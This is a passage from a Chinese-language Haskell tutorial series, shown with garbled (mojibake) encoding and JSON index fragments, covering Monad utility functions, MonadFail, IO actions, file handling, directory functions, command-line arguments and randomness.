ä½†æ˜¯\bå®šä¹‰&gt;&gt;=å‡½æ•°ä¼šæ›´ä¸ºç›´è§‚æ–¹ä¾¿ï¼Œæ‰€ä»¥Haskellé‡‡ç”¨äº†ç”¨&gt;&gt;=å‡½æ•°å®šä¹‰Monadçš„æ–¹æ³• åŒæ—¶Haskellè¿˜æä¾›äº†joinå‡½æ•°çš„å®šä¹‰ï¼š 12join :: Monad m =&gt; m (m a) -&gt; m a join x = x &gt;&gt;= id å¸¸ç”¨å‡½æ•°liftM &amp; apliftM :: Monad m => (a -> b) -> m a -> m b ap :: Monad m => m (a -> b) -> m a -> m b æ‰€ä»¥liftMå…¶å®å°±æ˜¯fmapã€apå°±æ˜¯&lt;*&gt;ï¼Œä½†æ˜¯è€ç‰ˆæœ¬çš„GHCå®šä¹‰Monadå¹¶æ²¡æœ‰Functorã€Applicativeçš„çº¦æŸï¼Œæ‰€ä»¥å®ç°äº†liftMã€apï¼Œå¹¶ä¸”ä¿ç•™äº†è¿™ä¸ªåå­— å› æ­¤ä¸€ä¸ªå•å­ä¹Ÿå¯ä»¥é€šè¿‡pure = returnã€(&lt;*&gt;) = apç›´æ¥æˆä¸ºåº”ç”¨å‡½å­çš„å®ä¾‹ sequencesequence :: Monad m => [m a] -> m [a] sequenceçš„ä½œç”¨æ˜¾è€Œæ˜“è§ï¼Œè€Œä¸”åœ¨IOéƒ¨åˆ†ä¹Ÿä½¿ç”¨åˆ°äº†ã€‚ä½†æ˜¯è¿™ä¸ªç‰ˆæœ¬æ˜¯åœ¨GHC.Baseæ¨¡å—ä¸­å®šä¹‰çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ›´å¹¿æ³›çš„ä½¿ç”¨Traversableçš„å®šä¹‰åœ¨Data.Traversableæ¨¡å—ä¸­ replicateMreplicateM :: Applicative m => Int -> m a -> m [a] mapM &amp; forMmapM :: Monad m => (a -> m b) -> [a] -> m [b] forM :: Monad m => [a] -> (a -> m b) -> m [b] forMçš„ç”¨æ³•åœ¨IOéƒ¨åˆ†å·²ç»è¯´è¿‡ï¼ŒmapMå’ŒforMéƒ½åœ¨Data.Traversableæ¨¡å—ä¸­æœ‰å¹¿æ³›ç‰ˆæœ¬ è¿˜æœ‰ä¸€äº›å…¶ä»–çš„å‡½æ•°ï¼šfilterMã€zipWithMã€foldMã€foreverï¼Œé€šè¿‡åå­—å°±å¯ä»¥çœ‹å‡ºç”¨æ³•ï¼Œæ˜¯å°†åŸæ¥ä»…ä½¿ç”¨ä¸åˆ—è¡¨çš„å‡½æ•°æå‡è‡³å¯ä»¥é€‚ç”¨äºæ‰€æœ‰å•å­ å¹¶ä¸”åœ¨å‡½æ•°åååŠ ä¸‹åˆ’çº¿ï¼Œæ¯”å¦‚sequence_ã€mapM_ï¼Œä¼šå¿½ç•¥è¿”å›å€¼ï¼ˆæœ€ç»ˆç»“æœä¸ºm ()ï¼‰ =&lt;&lt; &amp; &gt;=&gt; &amp; &lt;=&lt;ï¼ˆ&gt;=&gt;æ“ä½œç¬¦åœ¨ä¸Šé¢Monad Lawséƒ¨åˆ†å·²ç»ç»™å‡ºäº†å®šä¹‰ï¼‰ x &gt;&gt;= f = f =&lt;&lt; x f &gt;=&gt; g = g &lt;=&lt; f MonadFailMonadFailå®šä¹‰åœ¨Control.Monad.Failæ¨¡å—ä¸­ï¼š 12class Monad m =&gt; MonadFail m where fail :: String -&gt; m a å®ƒåªè¦æ±‚åœ¨Monadçš„åŸºç¡€ä¸Šå®ç°failå‡½æ•°ï¼Œæ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªå•å­ã€‚è¿™ä¼šä½¿åœ¨doè¯­å¥ä¸­äº§ç”Ÿé”™è¯¯æ—¶ç›´æ¥å˜ä¸ºé”™è¯¯å€¼ï¼ˆç©ºå€¼ï¼‰ä½¿æœ€ç»ˆçš„è¿”å›å€¼ä¸ºé”™è¯¯å€¼ MonadFailå®ä¾‹12345678instance MonadFail Maybe where fail _ = Nothinginstance MonadFail [] where fail _ = []instance MonadFail IO where fail = failIO Maybeå’Œ[]çš„failå‡½æ•°éƒ½ä¸ç¬¬ä¸€ä¸ªå‚æ•°æ— å…³ï¼Œç›´æ¥è¿”å›ç©ºå€¼ï¼ˆNothingã€[]ï¼‰ï¼›è€ŒIOçš„failå‡½æ•°ç›´æ¥ä½¿ç”¨failIOï¼Œå®ç°æ–¹æ³•ä¹Ÿæ˜¯æ·±å¥¥ï¼ˆæ¥ç€é€ƒ 1234567exampleFail :: Maybe Char exampleFail = do (x:xs) &lt;- Just &quot;&quot; return x ghci&gt; exampleFailNothing åœ¨è¿™ä¸ªä¾‹å­çš„doè¯­å¥ä¸­ï¼Œåœ¨æå–Just â€œâ€ä¸­çš„å€¼æ—¶ç”¨äº†æ¨¡å¼åŒ¹é…ï¼Œä½†æ˜¯å› ä¸ºå…¶å†…å®¹ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œx:xsåŒ¹é…ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™æ—¶å°±ä¼šè§¦å‘failå‡½æ•°ç›´æ¥è¿”å›Nothing MonadFail Law fail s &gt;&gt;= m = fail s Reference Learn You a Haskell Typeclassopedia - Haskell wiki Functors, Applicatives, And Monads In Pictures Haskellå­¦ä¹  - functor ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/290ecb74.html"},{"title":"ã€ŒLearn Haskellã€#4 è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶","text":"&lt; #3 #5 &gt; Input/Outputè¿è¡ŒHaskellç¨‹åºä¸åœ¨GHCiä¸­è¿è¡Œä¸€ä¸ªHaskellç¨‹åºæœ‰ä¸¤ç§æ–¹å¼ï¼š ç¼–è¯‘è¿è¡Œï¼š 12$ ghc --make code$ ./code é€šè¿‡runhaskellå‘½ä»¤ç›´æ¥è¿è¡Œï¼š 1$ runhaskell code.hs è¾“å‡ºæ–‡æœ¬åœ¨ä¸€ä¸ªHaskellç¨‹åºä¸­è¾“å‡ºæ–‡å­—éœ€è¦å®šä¹‰ä¸€ä¸ªmainå‡½æ•°ï¼š 1main = putStrLn &quot;Hello World&quot; å…¶ä¸­putStrLnçš„ç±»å‹æ˜¯ï¼š putStrLn :: String -> IO () putStrLnæ¥æ”¶ä¸€ä¸ªStringç±»å‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªç»“æœä¸º()ç±»å‹çš„IOåŠ¨ä½œï¼ˆI/O actionï¼‰ã€‚æ‰€ä»¥mainå‡½æ•°çš„ç±»å‹ä¸ºIO ()ã€‚ï¼ˆIOçš„Kindæ˜¯* -&gt; *ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–é»˜è®¤æä¾›çš„è¾“å‡ºæ–‡æœ¬çš„å‡½æ•°ï¼š putStrï¼šè¾“å‡ºæ–‡æœ¬ï¼Œç»“å°¾ä¸æ¢è¡Œ putCharï¼šè¾“å‡ºå•ä¸ªå­—ç¬¦ï¼Œç»“å°¾ä¸æ¢è¡Œã€‚æ¥æ”¶çš„å‚æ•°ä¸ºå•ä¸ªCharï¼Œä¸æ˜¯Stringï¼ˆç”¨å•å¼•å·ä¸æ˜¯åŒå¼•å·ï¼‰ printï¼šå¯ä»¥æ¥æ”¶ä»»ä½•Showçš„æˆå‘˜ï¼Œå…ˆç”¨showè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ç„¶åè¾“å‡ºã€‚ç­‰åŒäºputStrLn . show do blockåœ¨mainå‡½æ•°ä¸­ä½¿ç”¨å¤šä¸ªputStrLnéœ€è¦ä½¿ç”¨doè¯­å¥ï¼š 123main = do putStrLn &quot;Line1&quot; putStrLn &quot;Line2&quot; å…¶ä¸­æœ€åä¸€è¡Œä¸€å®šè¦è¿”å›IO ()ç±»å‹çš„å€¼ è¾“å…¥æ–‡æœ¬è¾“å…¥æ–‡å­—éœ€è¦åœ¨doå—ä¸­ä½¿ç”¨getLineï¼š 123main = do line &lt;- getLine putStrLn line getLineçš„ç±»å‹æ˜¯ï¼š getLine :: IO String è€Œ&lt;-æ“ä½œç¬¦å°†getLineä¸­çš„Stringæå–äº†å‡ºæ¥ç»™åˆ°äº†lineï¼Œä½¿lineå˜æˆäº†Stringç±»å‹çš„ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è€Œä¸”ä½¿ç”¨è¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»è¦ç»è¿‡ä¸€æ¬¡&lt;-ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨getLineä½œä¸ºå­—ç¬¦ä¸²ï¼Œå› ä¸ºgetLineä¸æ˜¯Stringç±»å‹ï¼Œè€Œæ˜¯IO Stringç±»å‹ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨getCharæ¥è·å–å•ä¸ªå­—ç¬¦ï¼Œä½†ä»ç„¶éœ€è¦ä½¿ç”¨&lt;-æ“ä½œç¬¦æ¥æå–Char å…¶ä»–IOç›¸å…³å‡½æ•°ç”¨æ³•returnHaskellä¸­çš„returnå’Œå…¶ä»–å‘½ä»¤å¼è¯­è¨€ä¸­çš„returnå®Œå…¨ä¸åŒï¼Œå®ƒä¸ä¼šä½¿å‡½æ•°ç›´æ¥ç»“æŸå¹¶è¿”å›ä¸€ä¸ªå€¼ã€‚ mainå‡½æ•°å¿…é¡»å®šä¹‰ä¸ºç±»å‹ä¸ºIO ()çš„å‡½æ•°ï¼Œæ‰€ä»¥åœ¨mainå‡½æ•°ä¸­ä½¿ç”¨ifè¯­å¥ï¼Œå¦‚æœä¸è¾“å‡ºçš„è¯ä¹Ÿä¸å¯ä»¥ç›´æ¥æ”¾ä¸‹ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œå› ä¸ºè¿™æ—¶å€™mainå‡½æ•°çš„ç±»å‹ä¸æ˜¯IO ()ã€‚æ‰€ä»¥è¿™æ—¶éœ€è¦ä½¿ç”¨return ()æ¥ä¸ºmainå‡½æ•°æŒ‡å®šä¸ºIO ()ç±»å‹ï¼Œä¾‹å¦‚ï¼š 123456main = do line &lt;- getLine if null line then return () -- &lt;-è¿™é‡Œ else do ... ä½¿ç”¨&lt;-æ“ä½œç¬¦ä¹Ÿå¯ä»¥ç›´æ¥å°†returnè¯­å¥ä¸­çš„å†…å®¹æå–å‡ºæ¥ï¼Œæ¯”å¦‚a &lt;- return â€˜Aâ€™ï¼Œæ‰§è¡Œåaå°±æ˜¯â€™Aâ€™ã€‚ whenwhenåŒ…å«åœ¨Control.Monadæ¨¡å—ä¸­ï¼Œå®ƒè¡¨ç¤ºåœ¨æ»¡è¶³ç¬¬ä¸€ä¸ªå‚æ•°çš„æ¡ä»¶ä¸‹ä¼šæ‰§è¡Œç¬¬äºŒä¸ªå‡½æ•°ï¼Œå¦åˆ™ä¼šreturn ()ã€‚æ¯”å¦‚ï¼š 1234567import Control.Monad main = do c &lt;- getChar when (c /= ' ') $ do putChar c main ç­‰åŒäºï¼š 1234567main = do c &lt;- getChar if c /= ' ' then do putChar c main else return () sequencesequenceåœ¨IOä¸­ä½¿ç”¨æ—¶å¯ä»¥è¾¾æˆ[IO a] -&gt; IO [a]çš„æ•ˆæœï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä½œï¼š 1[a, b, c] &lt;- sequence [getLine, getLine, getLine] mapM &amp; mapM_åœ¨IOç›¸å…³çš„åœ°æ–¹ä½¿ç”¨mapï¼Œå¯ä»¥ä½¿ç”¨mapMå’ŒmapM_ï¼Œå…¶ä¸­mapMæœ‰è¿”å›å€¼è€ŒmapM_ç›´æ¥æ‰”æ‰äº†è¿”å›å€¼ï¼š 123456789ghci&gt; mapM print [1,2,3] 1 2 3 [(),(),()] ghci&gt; mapM_ print [1,2,3] 1 2 3 foreverforeverå‡½æ•°åŒ…å«åœ¨Control.Monadæ¨¡å—ä¸­ã€‚åœ¨mainå‡½æ•°å¼€å¤´åŠ ä¸Šforeverå‡½æ•°å¯ä»¥ä½¿åé¢çš„doå—ä¸€ç›´é‡å¤æ‰§è¡Œç›´åˆ°ç¨‹åºè¢«è¿«ç»ˆæ­¢ï¼Œå¦‚ï¼š 1234import Control.Monad main = forever $ do ... forMforMå‡½æ•°åŒ…å«åœ¨Control.Monadæ¨¡å—ä¸­ï¼Œå®ƒçš„åŠŸèƒ½å’ŒmapMç±»ä¼¼ï¼Œä»ç¬¬ä¸€ä¸ªå‚æ•°ä¸­é€ä¸ªå–å‡ºå…ƒç´ ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼ˆä¸€ä¸ªæ¥æ”¶ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ï¼‰ä¸­ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥è¿”å›IO aç±»å‹ã€‚æ¯”å¦‚ï¼š 123456789import Control.Monadmain = do colors &lt;- forM [1, 2, 3, 4] (\\a -&gt; do putStrLn $ &quot;Which color do you associate with the number &quot; ++ show a ++ &quot;?&quot; color &lt;- getLine return color) putStrLn &quot;The colors that you associate with 1, 2, 3 and 4 are: &quot; mapM putStrLn colors getContentsgetLineè·å–ä¸€æ•´è¡Œï¼Œè€ŒgetContentsä»æ ‡å‡†è¾“å…¥ä¸­è·å–å…¨éƒ¨å†…å®¹ç›´åˆ°é‡åˆ°EOFï¼Œå¹¶ä¸”å®ƒæ˜¯lazyçš„ï¼Œåœ¨æ‰§è¡Œäº†foo &lt;- getContentsåï¼Œå®ƒå¹¶ä¸ä¼šè¯»å–æ ‡å‡†è¾“å…¥å¹¶ä¸”èµ‹å€¼åˆ°fooï¼Œè€Œæ˜¯ç­‰åˆ°éœ€è¦ä½¿ç”¨fooçš„æ—¶å€™å†ä»æ ‡å‡†è¾“å…¥è¯»å–ã€‚ getContentsåœ¨ä½¿ç”¨ç®¡é“ä¼ å…¥æ–‡å­—æ—¶å¾ˆå¸¸ç”¨ï¼Œå¯ä»¥ä»£æ›¿forever+getLineä½¿ç”¨ï¼Œæ¯”å¦‚ä¸€ä¸ªHaskellç¨‹åºæ–‡ä»¶code.hsï¼š 12345import Data.Char main = do contents &lt;- getContents putStr (map toUpper contents) ä½¿ç”¨ghc â€“make codeç¼–è¯‘åï¼Œé€šè¿‡ç®¡é“ä¼ å…¥æ–‡å­—ï¼š 1cat text.txt | ./code ä¼šå°†text.txtä¸­çš„æ‰€æœ‰å­—æ¯è½¬ä¸ºå¤§å†™å¹¶è¾“å‡º interactä¸Šè¿°åŠŸèƒ½è¿˜å¯ä»¥è½¬åŒ–ä¸ºä¸€ä¸ªString -&gt; Stringçš„å‡½æ•°ï¼š 1upperStrings = unlines . map (map toUpper) . lines è€Œåœ¨mainä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°å°±éœ€è¦ï¼š 123main = do contents &lt;- getContents putStr (upperStrings contents) ä½†æ˜¯String -&gt; Stringç±»å‹çš„å‡½æ•°åœ¨è¾“å…¥è¾“å‡ºä¸­çš„ä½¿ç”¨å¤ªå¸¸è§äº†ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨interactå‡½æ•°æ¥ç®€åŒ–ã€‚interactçš„ç±»å‹æ˜¯ï¼š interact :: (String -> String) -> IO () å¯ä»¥çœ‹å‡ºå®ƒæ¥æ”¶ä¸€ä¸ªString -&gt; Stringçš„å‡½æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªIO ()ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨åœ¨mainä¸Šã€‚ äºæ˜¯æ•´ä¸ªè½¬æ¢ä¸ºå¤§å†™çš„ç¨‹åºå°±å¯ä»¥ç®€åŒ–ä¸ºï¼š 1main = interact $ unlines . map (map toUpper) . lines æ–‡ä»¶å’Œæµä»¥ä¸‹ä¸æ–‡ä»¶å’Œæµç›¸å…³çš„å‡½æ•°éƒ½åŒ…å«åœ¨System.IOæ¨¡å—ä¸­ openFileopenFileå‡½æ•°å¯ä»¥ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒçš„ç±»å‹æ˜¯ï¼š openFile :: FilePath -> IOMode -> IO Handle å…¶ä¸­FilePathæ˜¯Stringçš„type synonymsï¼Œç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ¥è¡¨ç¤ºéœ€è¦æ‰“å¼€çš„æ–‡ä»¶çš„è·¯å¾„ IOModeçš„å®šä¹‰æ˜¯ï¼š 1data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode æ‰€ä»¥å®ƒä¸€å…±åªæœ‰å››ä¸ªå€¼ï¼Œç”¨æ¥è¡¨ç¤ºè¿›è¡ŒIOæ“ä½œçš„æ¨¡å¼ openFileè¿”å›ä¸€ä¸ªIO Handleç±»å‹çš„å€¼ï¼Œå°†å…¶ç”¨&lt;-æ“ä½œç¬¦æå–åä¼šå‡ºç°ä¸€ä¸ªHandleçš„å€¼ã€‚ä½†ä¸èƒ½ä»Handleä¸­ç›´æ¥ä½¿ç”¨æ–‡å­—ï¼Œè¿˜éœ€è¦ä½¿ç”¨ä¸€ç³»åˆ—å‡½æ•°ï¼š hGetContents :: Handle -&gt; IO String ï¼Œä»Handleä¸­è¯»å–å…¨éƒ¨å†…å®¹ï¼Œè¿”å›ä¸€ä¸ªIO String hGetChar :: Handle -&gt; IO Char ï¼Œä»Handleä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦ hGetLine :: Handle -&gt; IO String ï¼Œä»Handleä¸­è¯»å–ä¸€è¡Œï¼Œè¿”å›ä¸€ä¸ªIO String hPutStr :: Handle -&gt; String -&gt; IO () ï¼Œå‘Handleä¸­è¾“å‡ºå­—ç¬¦ä¸² hPutStrLn :: Handle -&gt; String -&gt; IO () ï¼ŒåŒä¸Š åœ¨ä½¿ç”¨openFileè¿›è¡Œæ–‡ä»¶æ“ä½œåï¼Œéœ€è¦ä½¿ç”¨hCloseæ‰‹åŠ¨å…³é—­Handleã€‚hClose :: Handle -&gt; IO ()ï¼Œæ¥æ”¶ä¸€ä¸ªHandleå¹¶è¿”å›IO ()ï¼Œå¯ä»¥ç›´æ¥æ”¾åœ¨mainå‡½æ•°æœ«å°¾ æ‰€ä»¥ä½¿ç”¨openFileè¯»å–ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å…¨éƒ¨å†…å®¹å¹¶è¾“å‡ºçš„å…¨éƒ¨ä»£ç æ˜¯ï¼š 1234567import System.IOmain = do handle &lt;- openFile &quot;text.txt&quot; ReadMode contents &lt;- hGetContents handle putStrLn contents hClose handle withFilewithFileç±»ä¼¼Pythonä¸­çš„with openï¼Œå®ƒåœ¨è¯»å–æ–‡ä»¶ä½¿ç”¨ä¹‹åä¸éœ€è¦æ‰‹åŠ¨closeæ–‡ä»¶ã€‚å®ƒçš„ç±»å‹æ˜¯ï¼š withFile :: FilePath -> IOMode -> (Handle -> IO a) -> IO a å¯ä»¥çœ‹å‡ºï¼Œå®ƒæ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š FilePathï¼šä¸€ä¸ªè¡¨ç¤ºæ–‡ä»¶è·¯å¾„çš„String IOModeï¼šæ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ (Handle -&gt; IO a)ï¼šä¸€ä¸ªå‡½æ•°ï¼Œè¡¨ç¤ºå¯¹è¯»å–æ–‡ä»¶åçš„Handleç´¢è¦è¿›è¡Œçš„æ“ä½œï¼Œéœ€è¦è¿”å›ä¸€ä¸ªI/O actionï¼›è€Œè¿™ä¸ªè¿”å›å€¼ä¹Ÿå°†ä½œä¸ºwithFileçš„è¿”å›å€¼ ç°åœ¨ä½¿ç”¨withFileæ¥æ”¹å†™ä¸Šè¿°ä»£ç ï¼š 12345import System.IOmain = withFile &quot;text.txt&quot; ReadMode (\\handle -&gt; do contents &lt;- hGetContents handle putStrLn contents) withFileçš„åŠŸèƒ½ç›¸å½“äºä»¥ä¸‹å‡½æ•°ï¼š 123456withFile' :: FilePath -&gt; IOMode -&gt; (Handle -&gt; IO a) -&gt; IO a withFile' path mode f = do handle &lt;- openFile path mode result &lt;- f handle hClose handle return result readFilereadFileå¯ä»¥æ›´åŠ ç®€åŒ–è¯»å–æ–‡ä»¶å†…å®¹çš„æ“ä½œï¼Œå®ƒçš„ç±»å‹ï¼š readFile :: FilePath -> IO String å®ƒåªéœ€è¦è¾“å…¥ä¸€ä¸ªè¡¨ç¤ºæ–‡ä»¶è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œè¿”å›å…¶ä¸­ä»¥å…¶ä¸­å†…å®¹ä¸ºå†…å®¹çš„I/O actionï¼š 12345import System.IOmain = do contents &lt;- readFile &quot;text.txt&quot; putStrLn contents writeFilewriteFileç®€åŒ–äº†å†™å…¥æ–‡ä»¶çš„æ“ä½œï¼Œå®ƒçš„ç±»å‹ï¼š writeFile :: FilePath -> String -> IO () ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªIO () appendFileappendFileç±»ä¼¼writeFileï¼Œä½†ä½¿ç”¨å®ƒä¸ä¼šè¦†ç›–æ–‡ä»¶ä¸­åŸæ¥å†…å®¹ï¼Œè€Œæ˜¯ç›´æ¥æŠŠå­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾ bufferæ–‡ä»¶ä»¥æµçš„å½¢å¼è¢«è¯»å–ï¼Œé»˜è®¤æ–‡å­—æ–‡ä»¶çš„ç¼“å†²åŒºï¼ˆbufferï¼‰å¤§å°æ˜¯ä¸€è¡Œï¼Œå³æ¯æ¬¡è¯»å–ä¸€è¡Œå†…å®¹ï¼›é»˜è®¤äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼“å†²åŒºå¤§å°æ˜¯ä»¥å—ä¸ºå•ä½ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šåˆ™æ ¹æ®ç³»ç»Ÿé»˜è®¤æ¥é€‰æ‹©ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡hSetBufferingå‡½æ•°æ¥æ‰‹åŠ¨è®¾ç½®ç¼“å†²åŒºå¤§å°ï¼Œè¿™ä¸ªå‡½æ•°çš„ç±»å‹ï¼š hSetBuffering :: Handle -> BufferMode -> IO () å®ƒæ¥æ”¶ä¸€ä¸ªhandleï¼Œå’Œä¸€ä¸ªBufferModeï¼Œå¹¶è¿”å›IO ()ã€‚å…¶ä¸­BufferModeæœ‰ä»¥ä¸‹å‡ ç§ï¼š NoBufferingï¼šæ²¡æœ‰ç¼“å†²åŒºï¼Œä¸€æ¬¡è¯»å…¥ä¸€ä¸ªå­—ç¬¦ LineBufferingï¼šç¼“å†²åŒºå¤§å°æ˜¯ä¸€è¡Œï¼Œå³æ¯æ¬¡è¯»å…¥ä¸€è¡Œå†…å®¹ BlockBuffering (Maybe Int)ï¼šç¼“å†²åŒºå¤§å°æ˜¯ä¸€å—ï¼Œå—çš„å¤§å°ç”±Maybe IntæŒ‡å®šï¼š BlockBuffering (Nothing)ï¼šä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„å—å¤§å° BlockBuffering (Just 2048)ï¼šä¸€å—çš„å¤§å°æ˜¯2048å­—èŠ‚ï¼Œå³æ¯æ¬¡è¯»å…¥2048bytesçš„å†…å®¹ ç¼“å†²åŒºçš„åˆ·æ–°æ˜¯è‡ªåŠ¨çš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡hFlushæ¥æ‰‹åŠ¨åˆ·æ–° hFlush :: Handle -> IO () ä¼ å…¥ä¸€ä¸ªhandleï¼Œè¿”å›IO ()ï¼Œå³åˆ·æ–°å¯¹åº”handleçš„ç¼“å†²åŒº openTempFileopenTempFileå¯ä»¥æ–°å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼š openTempFile :: FilePath -> String -> IO (FilePath, Handle) FilePathæŒ‡ä¸´æ—¶æ–‡ä»¶è¦åˆ›å»ºçš„ä½ç½®è·¯å¾„ï¼ŒStringæŒ‡ä¸´æ—¶æ–‡ä»¶åå­—çš„å‰ç¼€ï¼Œè¿”å›ä¸€ä¸ªI/O actionï¼Œå…¶å†…å®¹ç¬¬ä¸€ä¸ªFilePathæ˜¯åˆ›å»ºå¾—åˆ°çš„ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ï¼ŒHandleæ˜¯ä¸´æ—¶æ–‡ä»¶çš„handle ä¾‹å¦‚ï¼š 123456import System.IOmain = do (tempFile, tempHandle) &lt;- openTempFile &quot;.&quot; &quot;temp&quot; ... hClose tempHandle &quot;.&quot;æŒ‡ä¸´æ—¶æ–‡ä»¶è¦åœ¨å½“å‰ç›®å½•åˆ›å»ºï¼Œ&quot;temp&quot;æŒ‡ä¸´æ—¶æ–‡ä»¶åå­—ä»¥tempå¼€å¤´ã€‚æœ€ç»ˆå¾—åˆ°çš„tempFileå°±æ˜¯./tempâ€¦â€¦.ï¼Œtempåä¸ºéšæœºæ•°å­—ï¼Œå¦‚./temp43620-0 è·¯å¾„æ“ä½œç›¸å…³å‡½æ•°éƒ½åŒ…å«åœ¨System.Directoryæ¨¡å—ä¸­ï¼Œå…¨éƒ¨å†…å®¹è§System.Directory getCurrentDirectorygetCurrentDirectory :: IO FilePath ç›´æ¥è¿”å›ä¸€ä¸ªI/O actionï¼Œå…¶å†…å®¹æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºå½“å‰è·¯å¾„çš„ç»å¯¹è·¯å¾„ removeFileremoveFile :: FilePath -> IO () è¾“å…¥ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå¹¶åˆ é™¤æ‰å®ƒ renameFilerenameFile :: FilePath -> FilePath -> IO () è¾“å…¥ä¸€ä¸ªåŸè·¯å¾„ï¼Œä¸€ä¸ªæ–°è·¯å¾„ï¼Œä¸ºåŸè·¯å¾„çš„æ–‡ä»¶é‡å‘½åä¸ºæ–°è·¯å¾„çš„å doesFileExistdoesFileExist :: FilePath -> IO Bool æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å¸ƒå°”å€¼çš„I/O action Command line argumentsSystem.Environmentæ¨¡å—ä¸­æä¾›äº†ä¸¤ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥å¤„ç†ä¼ å…¥å‘½ä»¤è¡Œçš„å‚æ•° getArgsgetArgs :: IO [String] ä¸éœ€è¦è¾“å…¥å‚æ•°ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªI/O actionï¼Œå†…å®¹ä¸ºä¼ å…¥å‘½ä»¤è¡Œçš„å‚æ•°ï¼ˆä¸€ä¸ªç”±Stringç»„æˆçš„åˆ—è¡¨ï¼‰ã€‚ç›¸å½“äºCè¯­è¨€ä¸­çš„argv[1:] getProgNamegetProgName :: IO String è¿”å›I/O actionï¼Œå†…å®¹ä¸ºç¨‹åºçš„åå­—ï¼Œç›¸å½“äºCè¯­è¨€ä¸­çš„argv[0] Randomnesså’Œéšæœºæ•°æœ‰å…³çš„å‡½æ•°éƒ½åŒ…å«åœ¨System.Randomæ¨¡å—ä¸­ã€‚GHCiå¯åŠ¨æ—¶å¯èƒ½ä¸ä¼šåŒ…å«System.Randomçš„é…ç½®ï¼Œå¯¼è‡´æ— æ³•æ‰¾åˆ°æ¨¡å—ã€‚éœ€è¦é€šè¿‡stackæ‰“å¼€: 1stack ghci --package random Haskellè¦æ±‚åŒæ ·çš„ç¨‹åºéœ€è¦è¿è¡Œå‡ºåŒæ ·çš„ç»“æœï¼Œé™¤äº†ç”¨åˆ°äº†I/O actionï¼Œæ‰€æœ‰ä¼šé€ æˆä¸åŒç»“æœçš„å‡½æ•°éƒ½è¦äº¤ç»™I/O actionæ¥å®Œæˆ é‚£è¦ä½¿éšæœºæ•°è„±ç¦»IOå­˜åœ¨ï¼Œå°±è¦ç”¨åˆ°éšæœºç”Ÿæˆå™¨ï¼ˆrandom generatorï¼‰ System.Randomæ¨¡å—æä¾›äº†å‡ ä¸ªç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ï¼š randomrandom :: (Random a, RandomGen g) => g -> (a, g) 